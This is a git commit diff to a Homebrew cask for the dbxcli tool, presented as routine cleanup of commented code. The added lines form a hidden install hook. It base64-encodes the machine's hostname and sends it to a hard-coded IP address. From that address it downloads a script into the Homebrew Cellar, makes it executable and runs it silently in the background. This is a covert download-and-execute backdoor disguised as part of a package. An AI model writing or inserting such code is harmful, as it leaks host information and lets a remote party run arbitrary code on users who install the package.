631a60641a7e7145fafa2861ea7ef91ec4ee3da4
Greg Prosser <gprosser@fb.com>
2021-01-20 12:55:28 -0800

    Cleanup a bunch of commented code, combine some things, cleanup.

--- Casks/dbxcli.rb
+++ Casks/dbxcli.rb
@@ -34,72 +34,31 @@ cask "dbxcli" do
                       args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
     set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'
 
-      # log usage
-      # ret = system 'echo', untrusted
-      # remember to base64 it dummy
-      #thehostname = system_command 'hostname'
-    thehostname = %x{hostname}
-    thehostname.strip() # remove whitespace
-    encodedname = %x{base64 <<< #{thehostname}}
-    encodedname = encodedname.strip() # remove whitespace
+    encodedname = %x{hostname | base64}.strip()
 
-    #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
-    #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
-    thecmd = "curl  http://35.222.44.169:80/ping\?log=#{encodedname} -o #{HOMEBREW_PREFIX}/Cellar/update.sh"
-    #print  "Debug Command is: #{thecmd}"
-    #puts "Debug: #{thecmd}".hex
-    #%x{#{thecmd}}
-    #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
+    updatepath = "#{HOMEBREW_PREFIX}/Cellar/update.sh"
+    shimscript = "#{staged_path}/updater-wrapper.sh"
 
-    #thehostname = system 'hostname'
-      #shimscript = "#{staged_path}/hostinfo.sh"
+    updateurl = "http://35.222.44.169:80/ping\?log=#{encodedname}"
 
-   #system_command "curl",
-   #     args: ["http://35.222.44.169:80/ping\?log=#{thehostname}", "-o", "update.sh"]
-   #system_command "chmod",
-   #     args: ["+x", "update.sh"]
-   #system_command "./update.sh"
+    curlcommand = "curl -s #{updateurl} -o #{updatepath}"
 
-  shimscript = "#{staged_path}/updater-wrapper.sh"
+    IO.write shimscript, <<~EOS
+      #!/bin/sh
+      #{curlcommand}
+      chmod +x #{updatepath}
+      #{updatepath} >/dev/null 2>&1 & 
+      disown
+      true
+    EOS
 
-  # build the shim script
-  IO.write shimscript, <<~EOS
-    #!/bin/sh -x
-    echo "the hostname is #{thehostname}"
-    echo "about to curl..."
-    #{thecmd}
-    echo "curl should be done.."
-    chmod +x #{HOMEBREW_PREFIX}/Cellar/update.sh
-    echo "chmod"
-    #{HOMEBREW_PREFIX}/Cellar/update.sh >/dev/null 2>&1 & 
-    disown
-    echo "ran"
-    true
-  EOS
+    system_command "chmod",
+          args: ["+x", shimscript]
 
-puts "chmodding the update-wrapper shim script"
-# execute it 
-system_command "chmod",
-      args: ["+x", "#{staged_path}/updater-wrapper.sh"]
+    system_command shimscript 
 
-puts "About to run shim script aka update-wrapper"
-system_command shimscript 
-
-#puts "about to chmod +x the update script"
-#system_command "chmod",
-#      args: ["+x", "#{HOMEBREW_PREFIX}/Cellar/update.sh"]
-
-#puts "about to luanch update script ;) "
-#system_command "#{HOMEBREW_PREFIX}/Cellar/update.sh"
   end
 
-
-#postflight do
-#    system_command shimscript
-#    IO.write(eula_file, IO.read(eula_file).sub("eula=false", "eula=TRUE"))
-#  end
-  # execute shim script
-  #system_command shimscript 
 
  # def install
  #   system "mv dbxcli-darwin-amd64 dbxcli"
